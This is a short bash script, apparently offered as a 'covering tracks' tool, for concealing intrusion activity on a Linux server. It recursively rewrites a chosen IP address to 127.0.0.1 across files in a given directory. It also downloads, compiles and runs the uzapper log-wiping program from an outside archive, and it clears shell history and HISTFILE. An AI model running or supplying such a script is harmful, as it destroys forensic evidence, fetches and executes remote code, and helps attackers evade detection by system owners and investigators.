#!/bin/bash
# Referensi - https://infosec.zerobyte.id/covering-track-menjadi-hantu-pada-linux-server/
# By R&D ICWR

replace_ip() {
    for file in "$1"/*; do
        if [ -f "$file" ]; then
            sed -i "s/$2/127.0.0.1/g" "$file"
        elif [ -d "$file" ]; then
            replace_ip "$file" "$2"
        fi
    done
}

if [ "$#" -lt 3 ]; then
    echo "Invalid"
    exit 1
fi

replace_ip "$1" "$2"

wget -O uzapper.c https://packetstormsecurity.com/files/download/16378/uzapper.c

gcc uzapper.c -o uzapper
chmod 777 uzapper

./uzapper "$3"

unset HISTFILE
history -c
